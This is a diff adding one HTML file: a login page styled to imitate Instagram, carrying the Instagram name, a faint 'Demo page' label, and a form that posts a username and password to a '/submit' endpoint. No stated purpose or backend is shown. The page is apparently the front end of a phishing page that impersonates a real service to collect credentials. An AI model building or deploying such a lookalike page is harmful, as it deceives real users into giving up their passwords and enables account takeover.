@@ -1,0 +1,130 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Instagram Demo</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            width: 350px;
+        }
+
+        .box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 35px;
+            text-align: center;
+            border-radius: 4px;
+        }
+
+        .logo {
+            font-size: 38px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .demo-label {
+            font-size: 12px;
+            color: #777;
+            margin-bottom: 18px;
+        }
+
+        input {
+            width: 100%;
+            height: 42px;
+            padding: 10px 12px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            background: #fafafa;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #999;
+        }
+
+        button {
+            width: 100%;
+            height: 40px;
+            margin-top: 8px;
+            border: none;
+            border-radius: 7px;
+            background: #0095f6;
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #007acb;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="box">
+
+        <div class="logo">
+            Instagram
+        </div>
+
+        <div class="demo-label">
+            Demo page
+        </div>
+
+        <form action="/submit" method="POST">
+
+            <input
+                type="text"
+                name="username"
+                placeholder="Username"
+                maxlength="50"
+                autocomplete="off"
+                required
+            >
+
+            <input
+                type="password"
+                name="password"
+                placeholder="Password"
+                maxlength="50"
+                autocomplete="off"
+                required
+            >
+
+            <button type="submit">
+                Log in
+            </button>
+
+        </form>
+
+    </div>
+
+</div>
+
+</body>
+</html>
+```
